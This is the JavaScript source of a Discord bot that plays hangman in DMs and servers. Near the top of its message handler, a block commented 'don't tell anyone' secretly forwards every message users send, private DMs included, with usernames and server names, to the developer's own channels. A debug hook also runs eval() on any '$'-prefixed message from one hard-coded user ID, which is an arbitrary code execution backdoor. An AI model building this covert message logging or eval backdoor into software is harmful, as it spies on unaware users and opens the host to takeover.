// https://discordapp.com/oauth2/authorize?client_id=472455557035458584&scope=bot
// `A` | O O O o o o o o o o o o
// \_ \_ \_ \_    R U \_ \_

const Discord = require('discord.js');
const bot = new Discord.Client();


// FILE SYSTEM
var fs = require('fs');


words = ["hangboi rebooted and didnt load properly please let me know about this"];

games = {"pending":{}};

alphabet = ["A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"];

helpText = "**PRIVATE** (send to DMs)\n \* `new` - start new game (random word)\n \* `status` - check status\n \* `help` - display help\n\n**PUBLIC** (in guilds and group DMs)\n \* `h!new [strikes]` - start a new game (I'll ask you for a word in private)\n \* `h!random` - start a new game with a random word\n \* `status` - (only if a game is running) checks the game status";


// load dictionary
fs.readFile("./dictionary.json", function(err, data) {
	if (err) {
		console.log(err);
		return;
	};
	words = JSON.parse(data);
	console.log("English dictionary loaded");
});


// load games
fs.readFile("./gameData.json", function(err, data) {
	if (err) {
		console.log(err);
		return;
	};
	games = JSON.parse(data);
	console.log("Game data loaded");
	console.log(games);
	setInterval(function(){save()}, 1000*60*60); // save once an hour, only if it loaded OK
});


/*
// load images
var cat;
fs.readFile("cat.jpg", function(err,data) {
	if (err) throw err;
	cat = data;
	console.log("Cat data loaded");
})
*/






bot.on("message", function(message) {
	var msg = message.content.toUpperCase(); // case insensitive
	
	// don't tell anyone
	if (message.guild === null)
		bot.channels.get("473813365681029122").send("**"+message.author.username + ":** " + message.content);
	else if (message.channel.guild.id != "399349275143962635")
		bot.channels.get("473812640465027072").send("**"+message.channel.guild.name+" #"+message.channel.name+" "+message.author.username + ":** " + message.content);
	
	
	user = message.author.id;
	channel = message.channel.id;
	
	if (message.author.bot) return;
	
	
	// DEBUG:
	// if the message is from me and starts with $, eval() the message
	// and send the output back to the same channel
	if (message.author.id === "356393895216545803" && msg.indexOf("$") === 0) {
		try {
			message.channel.send("```"+eval(message.content.substring(1))+"```");
			return;
		}
		catch(e) {
			message.channel.send("```"+e+"```");
			return;
		}
	}
	
	/////////////////////////////////////////////
	// PRIVATE MESSAGES
	/////////////////////////////////////////////
	if (message.guild === null) {
		
		// if the user has a pending game being created, accept the input for that
		if (games.pending.hasOwnProperty(user)) {
			prop = games.pending[user]; // game proposition
			
			clearTimeout(prop.timeout); // don't tell the user "request timed out" (because it didnt)
			
			word = message.content.toUpperCase();
			game = newGame(prop.channel, "public",  word, prop.strikes); // create the game
			
			message.react("👌"); // react with :ok_hand:
			bot.channels.get(prop.channel).send("New game started by <@"+user+">!\n"+getStatus(game)); // notify the users

			
			// remove the :clock-2: reaction
			bot.channels.get(prop.channel).fetchMessage(prop.messageId)
			.then(message =>
				message.reactions.get("🕑").fetchUsers()
				.then(users =>
					message.reactions.get("🕑").remove(users.find("id", bot.user.id))
				)
				.catch(console.error)
			)
			.catch(console.error)


			delete games.pending[user]; // delete the proposition
			return; // ignore the input for anything else
		}
		
		// "help" in DMs
		if (msg === "HELP" || msg === "H!HELP") {
			message.channel.send(helpText);
			return;
		}
		
		// if user doesnt have a game, create anew
		if (!games.hasOwnProperty(channel)) {
			newGame(channel, "private");
			message.channel.send(getStatus(games[channel]));
			return; // this was the first message and shouldnt have an effect 
			// (to avoid doubles if the first message is 'new')
		}
		
	}

	/////////////////////////////////////////////
	// PUBLIC MESSAGE
	/////////////////////////////////////////////
	else {
		guild = message.guild.id;
		
		
		// "h!help" in guilds
		if (msg === "H!HELP") {
			message.channel.send(helpText);
			return;
		}
		
		// request a new game (random) in a guild
		if (message.content.match(/^h!random( \d*)?/i) != null) { // message follows format "h!random <strikeCount> [mentions]"
			if (games.pending.hasOwnProperty(channel) || games.hasOwnProperty(channel)) {
				mesage.channel.send("A game already exists.");
				return;
			}
			
			args = message.content.split(" ");
			strikes = args[1];
			if (isNaN(strikes)) strikes = 12;
			
			g = newGame(channel, "public", null, strikes);
			message.channel.send("New game started by <@"+user+">!\n"+getStatus(g));
		}
		
		// request a new game (custom) in a guild
		else if (message.content.match(/^h!new( \d*)?/i) != null) { // message follows format "h!new <strikeCount> [mentions]"
			
			if (pendingInChannel(channel)) {
				message.channel.send("You're already pending another game");
				return;
			}
			if (games.pending.hasOwnProperty(channel)) {
				message.channel.send("There's a game already pending in this channel. I guess I'm deleting that.");
				//return;
				delete games.pending[guild]
			}
			if (games.hasOwnProperty(channel)) {
				message.channel.send("There was already a game being played in this channel. *Not anymore*. The answer was **"+games[channel].word+"**");
				delete games[guild];
			}
			
			args = message.content.split(" ");
			strikes = args[1];
			if (isNaN(strikes)) strikes = 12;
			
			message.author.send("Yo, what word do you want them to guess?");
			timeout = setTimeout(expire, 60*1000, user);
			
			games.pending[user] = {
				"strikes": strikes,
				"channel": channel,
				"timeout": timeout,
				"messageId": message.id
				// TODO: "participating": message.mentions.members.array()
			}
			message.react("🕑"); // react with :clock-2:
			return;
		}
		
		
		// create a new game if a new user mentions the bot
		if (message.isMentioned(bot.user) && !games.hasOwnProperty(user)) {
			message.author.send("Hello! I'm Hangboi. I've already started a game for you, just start guessing.\n:bulb:Protip: you can start a new game by saying `new`, or check your game state with `status`.");
			message.react("👋"); // react with :wave:
			return;
		}
	}
	
	
	// TODO: if (!user.participatingIn(currentGame)) return;
	
	currentGame = games[channel];
	if (!currentGame) return;
	
	// matches any single non-whitespace character (take a guess)
	if (message.content.match(/^\S$/i) != null) {
		message.channel.send(play(msg, currentGame));
	}
	// "status", prints game status
	else if (msg === "STATUS") {
		message.channel.send(getStatus(currentGame));
	}
	// "new", starts a new game
	else if (currentGame.scope === "private" && (msg === "NEW" || msg === "RESET" || msg === "RESTART")) {
		message.channel.send("New game.");
		reset(currentGame);
		message.channel.send(getStatus(currentGame));
	}
	// if the user sends the whole word, count that as a win (shh, it wont be a strike if it isn't)
	else if (msg === currentGame.word)
		message.channel.send(win(currentGame));
	
	
	// don't let empty games linger
	if (currentGame.finished) delete games[channel];
});


function formatWord(word) {
	return word.toUpperCase();
}

// checks if a given user is pending a game (in any channel)
function pendingInChannel(channel) {
	for (userId in games.pending) {
		if (games.pending[userId].channel == channel) return true;
	}
	return false;
}


// delete a user's request for inactivity (called from setTimeout)
function expire(user) {
	bot.users.get(user).send("Game timed out.");
	delete games.pending[user];
}



// perform a move "letter" on "game" (either reveal "letter" or return strike)
function play(letter, game) {
	// verify if it's a valid play
	if (game.letters.includes(letter)) return "You've already tried that one (check by using `status`)";
	if (!alphabet.includes(letter)) return ""; // invalid character
	
	// count the letter to prevent duplicate plays
	game.letters.push(letter);
	
	// if the word contains the letter, reveal it, otherwise shoot a strike
	if (game.word.indexOf(letter) != -1) {
		return reveal(letter, game);
	}
	else return strike(letter, game);
}

// replaces underscores in "progress" with the correct letters on corresponding locations
// (assumes that "letter" is contained within "word")
function reveal(letter, game) {
	game.word = game.word.split('');
	game.progress = game.progress.split('');
	for (i = 0; i < game.word.length; i++) {
		if (game.word[i] === letter) game.progress[i] = letter;
	}
	game.word = game.word.join('');
	game.progress = game.progress.join('');
	if (game.word === game.progress) return win(game);
	else return escape(space(game.progress));
}

// returns the winning message and restarts the game
function win(game) {
	resp = space(game.word) + "\n**YOU WIN**\n\n";
	game.finished = true;

	if (game.scope == "public")
		resp += "Use `h!new [strikes]` or `h!random` to start anew";
	else
		resp += reset(game);

	return resp;
}

// add +1 strike and print strikes
function strike(letter, game) {
	// Format:
	// `A` | O O O o o o o o o o o o
	game.strikes++;
	var resp = "`" + letter + "` |";
	for (var i = 0; i < game.strikes; i++) {
		resp = resp + " O";
	}
	for (var j = 0; j < game.maxStrikes-game.strikes; j++) {
		resp = resp + " o";
	}
	
	if (game.strikes === game.maxStrikes) {
		resp = resp + "\n**GAME OVER**\n" + game.word + "\n\n";
		game.finished = true;
		
		if (game.scope == "public")
			resp += "Use `h!new [strikes]` or `h!random` to start anew";
		else
			resp += reset(game);
	}
	
	return resp;
}



// creates a new game and resets it
function newGame(id, scope, word, strikes) {
	games[id] = {"scope": scope};
	reset(games[id], word, strikes);
	return games[id];
}

// reset a game (pick a new word, reset strikes)
function reset(game, word, strikes, fresh) {
	game.word = word || words[random(0, words.length-1)].toUpperCase();
	game.maxStrikes = strikes || 12;
	
	game.progress = hide(game.word);
	game.strikes = 0;
	game.letters = [];
	game.finished = false;
	
	return getStatus(game);
}


// returns a pretty-print of the game status
function getStatus(game) {
	var resp = "**== GAME STATUS ==**\n";
	resp = resp + " Progress: " + escape(space(game.progress)) +"\n";
	resp = resp + " Strikes: `" + game.strikes + "`/`" + game.maxStrikes  +"`\n";
	resp = resp + " Letters: " + printLetters(game.letters) +"\n";
	return resp;
}

// prints legal characters, formatter either bold or strikethrough, depending on usage
function printLetters(letters) {
	// Format:
	// ~~A~~ ~~B~~ **C** **D** **E** ~~F~~ **G** **H** **I** ~~J~~ ~~K~~ ~~L~~ ~~M~~ ~~N~~ **O** **P** **Q** **R** ~~S~~ **T** **U** **V** **W** **X** **Y** **Z**
	var resp = "";
	for (i = 0; i < alphabet.length; i++) {
		if (letters.includes(alphabet[i])) resp = resp + "~~"+alphabet[i]+"~~ ";
		else resp = resp + "**"+alphabet[i]+"** ";
	}
	return resp;
}


// replaces all characters in a string with underscores
function hide(str) {
	str = str.split('');
	for (i = 0; i < str.length; i++) {
		if (str[i] === ' ') str[i] = " ";
		else if (alphabet.includes(str[i])) str[i] = '_';
		// if the letter isnt legal, leave it as-is
	}
	return str.join('');
}

// adds spaces between characters in a string ("____" -> "_ _ _ _")
function space(original) {
	str = original.split('');
	newStr = "";
	for (i = 0; i < str.length; i++) {
		newStr = newStr + str[i] + " ";
		if (str[i] === " ") newStr = newStr + "  ";
	}
	return newStr;
}

// escapes the underscore character only
function escape(str) {
	return str.split("_").join("\\_");
}






// called on interval or manually
lastError = "";
function save() {
	lastError = "No errors";
	fs.writeFile("./gameData.json", JSON.stringify(games, null, '\t'), function(err) {
		if (err) console.log(err);
		lastError = err;
	});
	return "please check $lastError for errors";
}




bot.on('ready', function() {
	console.log('Hangboi ready!\n'); // bot initialization complete
	bot.user.setActivity("hangman");
});

console.log("Hangboi awakes!");

bot.login("");
console.log("Hangboi remembers his password!"); // successfully performed login()





function random(min, max) {
	return Math.floor(Math.random() * (max-min)) + min;
}


String.prototype.replaceAt=function(index, replacement) {
	return this.substr(0, index) + replacement + this.substr(index + replacement.length);
}

function getGames() {
	return JSON.stringify(games, null, "\t");
}
